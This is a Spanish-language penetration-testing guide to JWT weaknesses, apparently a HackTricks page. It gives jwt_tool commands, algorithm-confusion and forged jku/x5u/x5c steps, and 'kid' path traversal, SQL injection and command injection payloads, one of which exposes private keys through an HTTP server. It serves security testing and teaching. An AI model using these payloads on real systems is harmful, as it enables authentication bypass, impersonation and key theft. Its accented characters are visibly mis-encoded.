# Vulnerabilidades de JWT (Json Web Tokens)

<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si est√°s interesado en una **carrera de hacking** y hackear lo imposible - **¬°estamos contratando!** (_se requiere dominio del polaco escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

**Parte de esta publicaci√≥n est√° basada en la incre√≠ble publicaci√≥n:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**Autor de la excelente herramienta para pentesting de JWTs** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **Victorias R√°pidas**

Ejecuta [**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) con el modo `¬°Todos los Tests!` y espera las l√≠neas verdes
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
Si tienes suerte, la herramienta encontrar√° alg√∫n caso donde la aplicaci√≥n web est√© verificando incorrectamente el JWT:

![](<../.gitbook/assets/image (435).png>)

Luego, puedes buscar la solicitud en tu proxy o volcar el JWT utilizado para esa solicitud usando la herramienta jwt\_:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### Manipular datos sin modificar nada

Simplemente puedes manipular los datos dejando la firma tal como est√° y verificar si el servidor est√° revisando la firma. Intenta cambiar tu nombre de usuario a "admin", por ejemplo.

#### **¬øSe verifica el token?**

Para verificar si la firma de un JWT est√° siendo verificada:

* Un mensaje de error sugiere una verificaci√≥n en curso; los detalles sensibles en errores detallados deben ser revisados.
* Un cambio en la p√°gina devuelta tambi√©n indica verificaci√≥n.
* La falta de cambio sugiere que no hay verificaci√≥n; en este caso, es cuando se debe experimentar con la manipulaci√≥n de las reclamaciones del payload.

### Origen

Es importante determinar si el token fue generado en el servidor o en el cliente examinando el historial de solicitudes del proxy.

* Los tokens vistos por primera vez desde el lado del cliente sugieren que la clave podr√≠a estar expuesta al c√≥digo del lado del cliente, lo que requiere una investigaci√≥n adicional.
* Los tokens que se originan en el servidor indican un proceso seguro.

### Duraci√≥n

Verifica si el token dura m√°s de 24 horas... tal vez nunca expire. Si hay un campo "exp", verifica si el servidor lo est√° manejando correctamente.

### Fuerza bruta del secreto HMAC

[**Ver esta p√°gina.**](../generic-methodologies-and-resources/brute-force.md#jwt)

### Modificar el algoritmo a None (CVE-2015-9235)

Establece el algoritmo utilizado como "None" y elimina la parte de la firma.

Utiliza la extensi√≥n Burp llamada "JSON Web Token" para probar esta vulnerabilidad y cambiar diferentes valores dentro del JWT (env√≠a la solicitud a Repeater y en la pesta√±a "JSON Web Token" puedes modificar los valores del token. Tambi√©n puedes seleccionar poner el valor del campo "Alg" en "None").

### Cambiar el algoritmo de RS256(asim√©trico) a HS256(sim√©trico) (CVE-2016-5431/CVE-2016-10555)

El algoritmo HS256 utiliza la clave secreta para firmar y verificar cada mensaje.\
El algoritmo RS256 utiliza la clave privada para firmar el mensaje y utiliza la clave p√∫blica para la autenticaci√≥n.

Si cambias el algoritmo de RS256 a HS256, el c√≥digo del backend utiliza la clave p√∫blica como la clave secreta y luego utiliza el algoritmo HS256 para verificar la firma.

Luego, utilizando la clave p√∫blica y cambiando RS256 a HS256 podr√≠amos crear una firma v√°lida. Puedes recuperar el certificado del servidor web ejecutando esto:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### Nueva clave p√∫blica dentro del encabezado

Un atacante incrusta una nueva clave en el encabezado del token y el servidor utiliza esta nueva clave para verificar la firma (CVE-2018-0114).

Esto se puede hacer con la extensi√≥n "JSON Web Tokens" de Burp.\
(Env√≠a la solicitud a Repeater, dentro de la pesta√±a JSON Web Token selecciona "CVE-2018-0114" y env√≠a la solicitud).

### Suplantaci√≥n de JWKS

Las instrucciones detallan un m√©todo para evaluar la seguridad de los tokens JWT, especialmente aquellos que emplean una afirmaci√≥n de encabezado "jku". Esta afirmaci√≥n debe enlazar a un archivo JWKS (JSON Web Key Set) que contenga la clave p√∫blica necesaria para la verificaci√≥n del token.

* **Evaluaci√≥n de Tokens con Encabezado "jku"**:
* Verificar la URL de la afirmaci√≥n "jku" para asegurarse de que conduzca al archivo JWKS apropiado.
* Modificar el valor "jku" del token para dirigirlo hacia un servicio web controlado, permitiendo la observaci√≥n del tr√°fico.
* **Monitoreo de la Interacci√≥n HTTP**:
* Observar las solicitudes HTTP a la URL especificada indica los intentos del servidor de recuperar claves desde el enlace proporcionado.
* Al emplear `jwt_tool` para este proceso, es crucial actualizar el archivo `jwtconf.ini` con la ubicaci√≥n personal de su JWKS para facilitar las pruebas.
* **Comando para `jwt_tool`**:
*   Ejecute el siguiente comando para simular el escenario con `jwt_tool`:

```bash
python3 jwt_tool.py JWT_AQU√ç -X s
```

### Resumen de Problemas de Kid

Una afirmaci√≥n de encabezado opcional conocida como `kid` se utiliza para identificar una clave espec√≠fica, lo cual es especialmente vital en entornos donde existen m√∫ltiples claves para la verificaci√≥n de la firma del token. Esta afirmaci√≥n ayuda a seleccionar la clave apropiada para verificar la firma de un token.

#### Revelaci√≥n de Clave a trav√©s de "kid"

Cuando la afirmaci√≥n `kid` est√° presente en el encabezado, se recomienda buscar en el directorio web el archivo correspondiente o sus variaciones. Por ejemplo, si se especifica `"kid":"key/12345"`, se deben buscar los archivos _/key/12345_ y _/key/12345.pem_ en la ra√≠z web.

#### Traves√≠a de Ruta con "kid"

La afirmaci√≥n `kid` tambi√©n podr√≠a ser explotada para navegar a trav√©s del sistema de archivos, lo que potencialmente permitir√≠a la selecci√≥n de un archivo arbitrario. Es factible probar la conectividad o ejecutar ataques de Falsificaci√≥n de Solicitudes del Lado del Servidor (SSRF) al alterar el valor `kid` para apuntar a archivos o servicios espec√≠ficos. Manipular el JWT para cambiar el valor `kid` manteniendo la firma original se puede lograr utilizando la bandera `-T` en jwt\_tool, como se muestra a continuaci√≥n:
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
Al dirigirse a archivos con contenido predecible, es posible falsificar un JWT v√°lido. Por ejemplo, el archivo `/proc/sys/kernel/randomize_va_space` en sistemas Linux, conocido por contener el valor **2**, puede ser utilizado en el par√°metro `kid` con **2** como la contrase√±a sim√©trica para la generaci√≥n del JWT.

#### Inyecci√≥n SQL a trav√©s de "kid"

Si el contenido de la afirmaci√≥n `kid` se emplea para obtener una contrase√±a de una base de datos, se podr√≠a facilitar una inyecci√≥n SQL modificando la carga √∫til de `kid`. Un ejemplo de carga √∫til que utiliza la inyecci√≥n SQL para alterar el proceso de firma del JWT incluye:

`non-existent-index' UNION SELECT 'ATTACKER';-- -`

Esta alteraci√≥n obliga a utilizar una clave secreta conocida, `ATTACKER`, para firmar el JWT.

#### Inyecci√≥n de SO a trav√©s de "kid"

Un escenario en el que el par√°metro `kid` especifica una ruta de archivo utilizada en un contexto de ejecuci√≥n de comandos podr√≠a llevar a vulnerabilidades de Ejecuci√≥n Remota de C√≥digo (RCE). Al inyectar comandos en el par√°metro `kid`, es posible exponer claves privadas. Un ejemplo de carga √∫til para lograr RCE y exposici√≥n de claves es:

`/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### x5u y jku

#### jku

jku significa **URL de Conjunto de JWK**.\
Si el token utiliza una afirmaci√≥n de encabezado ‚Äú**jku**‚Äù, **verifique la URL proporcionada**. Esta deber√≠a apuntar a una URL que contenga el archivo JWKS que contiene la Clave P√∫blica para verificar el token. Manipule el token para que el valor de jku apunte a un servicio web del cual pueda monitorear el tr√°fico.

Primero, es necesario crear un nuevo certificado con nuevas claves privadas y p√∫blicas.
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Entonces puedes usar por ejemplo [**jwt.io**](https://jwt.io) para crear el nuevo JWT con las **claves p√∫blicas y privadas creadas y apuntando el par√°metro jku al certificado creado.** Para crear un certificado jku v√°lido, puedes descargar el original y cambiar los par√°metros necesarios.

Puedes obtener los par√°metros "e" y "n" de un certificado p√∫blico usando:
```bash
from Crypto.PublicKey import RSA
fp = open("publickey.crt", "r")
key = RSA.importKey(fp.read())
fp.close()
print("n:", hex(key.n))
print("e:", hex(key.e))
```
#### x5u

X.509 URL. Un URI que apunta a un conjunto de certificados p√∫blicos X.509 (un est√°ndar de formato de certificado) codificados en forma PEM. El primer certificado en el conjunto debe ser el utilizado para firmar este JWT. Los certificados subsiguientes firman cada uno al anterior, completando as√≠ la cadena de certificados. X.509 est√° definido en RFC 52807. Se requiere seguridad de transporte para transferir los certificados.

Intenta **cambiar este encabezado por una URL bajo tu control** y verifica si se recibe alguna solicitud. En ese caso, **podr√≠as manipular el JWT**.

Para falsificar un nuevo token utilizando un certificado controlado por ti, necesitas crear el certificado y extraer las claves p√∫blica y privada:
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -out attacker.crt
openssl x509 -pubkey -noout -in attacker.crt > publicKey.pem
```
Entonces puedes usar, por ejemplo, [**jwt.io**](https://jwt.io) para crear el nuevo JWT con las **claves p√∫blicas y privadas creadas y apuntando el par√°metro x5u al certificado .crt creado**.

![](<../.gitbook/assets/image (439).png>)

Tambi√©n puedes abusar de ambas vulnerabilidades **para SSRFs**.

#### x5c

Este par√°metro puede contener el **certificado en base64**:

![](<../.gitbook/assets/image (440).png>)

Si el atacante **genera un certificado autofirmado** y crea un token falsificado usando la clave privada correspondiente y reemplaza el valor del par√°metro "x5c" con el certificado reci√©n generado y modifica los otros par√°metros, es decir, n, e y x5t, entonces esencialmente el token falsificado ser√≠a aceptado por el servidor.
```bash
openssl req -x509 -nodes -days 365 -newkey rsa:2048 -keyout attacker.key -outattacker.crt
openssl x509 -in attacker.crt -text
```
### Clave P√∫blica Incrustada (CVE-2018-0114)

Si el JWT tiene incrustada una clave p√∫blica como en el siguiente escenario:

![](<../.gitbook/assets/image (438).png>)

Utilizando el siguiente script de nodejs es posible generar una clave p√∫blica a partir de esos datos:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
n ="‚ÄãANQ3hoFoDxGQMhYOAc6CHmzz6_Z20hiP1Nvl1IN6phLwBj5gLei3e4e-DDmdwQ1zOueacCun0DkX1gMtTTX36jR8CnoBRBUTmNsQ7zaL3jIU4iXeYGuy7WPZ_TQEuAO1ogVQudn2zTXEiQeh-58tuPeTVpKmqZdS3Mpum3l72GHBbqggo_1h3cyvW4j3QM49YbV35aHV3WbwZJXPzWcDoEnCM4EwnqJiKeSpxvaClxQ5nQo3h2WdnV03C5WuLWaBNhDfC_HItdcaZ3pjImAjo4jkkej6mW3eXqtmDX39uZUyvwBzreMWh6uOu9W0DMdGBbfNNWcaR5tSZEGGj2divE8"‚Äã;
e = "AQAB";
const key = new NodeRSA();
var importedKey = key.importKey({n: Buffer.from(n, 'base64'),e: Buffer.from(e, 'base64'),}, 'components-public');
console.log(importedKey.exportKey("public"));
```
Es posible generar un nuevo par de claves privada/p√∫blica, incrustar la nueva clave p√∫blica dentro del token y usarla para generar una nueva firma:
```bash
openssl genrsa -out keypair.pem 2048
openssl rsa -in keypair.pem -pubout -out publickey.crt
openssl pkcs8 -topk8 -inform PEM -outform PEM -nocrypt -in keypair.pem -out pkcs8.key
```
Puedes obtener el "n" y "e" usando este script de nodejs:
```bash
const NodeRSA = require('node-rsa');
const fs = require('fs');
keyPair = fs.readFileSync("keypair.pem");
const key = new NodeRSA(keyPair);
const publicComponents = key.exportKey('components-public');
console.log('Parameter n: ', publicComponents.n.toString("hex"));
console.log('Parameter e: ', publicComponents.e.toString(16));
```
Finalmente, utilizando la clave p√∫blica y privada y los nuevos valores "n" y "e" puedes usar [jwt.io](https://jwt.io) para forjar un nuevo JWT v√°lido con cualquier informaci√≥n.

### JTI (JWT ID)

La afirmaci√≥n JTI (JWT ID) proporciona un identificador √∫nico para un Token JWT. Puede ser utilizado para evitar que el token sea reutilizado.\
Sin embargo, imagina una situaci√≥n donde la longitud m√°xima del ID es 4 (0001-9999). La solicitud 0001 y 10001 van a utilizar el mismo ID. Por lo tanto, si el backend est√° incrementando el ID en cada solicitud, podr√≠as abusar de esto para **repetir una solicitud** (necesitando enviar 10000 solicitudes entre cada repetici√≥n exitosa).

### Reclamos registrados en JWT

{% embed url="https://www.iana.org/assignments/jwt/jwt.xhtml#claims" %}

### Otros ataques

**Ataques de Relevo entre Servicios**

Se ha observado que algunas aplicaciones web conf√≠an en un servicio JWT de confianza para la generaci√≥n y gesti√≥n de sus tokens. Se han registrado casos en los que un token, generado para un cliente por el servicio JWT, fue aceptado por otro cliente del mismo servicio JWT. Si se observa la emisi√≥n o renovaci√≥n de un JWT a trav√©s de un servicio de terceros, se debe investigar la posibilidad de registrarse en una cuenta en otro cliente de ese servicio utilizando el mismo nombre de usuario/correo electr√≥nico. Luego se debe intentar repetir el token obtenido en una solicitud al objetivo para ver si es aceptado.

* La aceptaci√≥n de tu token podr√≠a indicar un problema cr√≠tico, potencialmente permitiendo la suplantaci√≥n de la cuenta de cualquier usuario. Sin embargo, se debe tener en cuenta que podr√≠a ser necesario obtener permiso para pruebas m√°s amplias si se registra en una aplicaci√≥n de terceros, ya que esto podr√≠a entrar en un √°rea legal gris.

**Verificaci√≥n de Caducidad de Tokens**

La caducidad del token se verifica utilizando el reclamo de carga √∫til "exp". Dado que los JWT a menudo se utilizan sin informaci√≥n de sesi√≥n, se requiere un manejo cuidadoso. En muchos casos, capturar y repetir el JWT de otro usuario podr√≠a permitir la suplantaci√≥n de ese usuario. El RFC de JWT recomienda mitigar los ataques de repetici√≥n de JWT utilizando el reclamo "exp" para establecer un tiempo de caducidad para el token. Adem√°s, la implementaci√≥n de verificaciones relevantes por parte de la aplicaci√≥n para garantizar el procesamiento de este valor y el rechazo de tokens caducados es crucial. Si el token incluye un reclamo "exp" y los l√≠mites de tiempo de prueba lo permiten, se recomienda almacenar el token y repetirlo despu√©s de que haya pasado el tiempo de caducidad. El contenido del token, incluida la interpretaci√≥n de la marca de tiempo y la verificaci√≥n de caducidad (marca de tiempo en UTC), se puede leer utilizando la bandera -R de la herramienta jwt_tool.

* Puede existir un riesgo de seguridad si la aplicaci√≥n a√∫n valida el token, ya que podr√≠a implicar que el token nunca caduque.

### Herramientas

{% embed url="https://github.com/ticarpi/jwt_tool" %}

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Si est√°s interesado en una **carrera de hacking** y hackear lo imposible - **¬°estamos contratando!** (_se requiere dominio del polaco escrito y hablado_).

{% embed url="https://www.stmcyber.com/careers" %}

<details>

<summary><strong>Aprende hacking en AWS de cero a h√©roe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠guenos** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
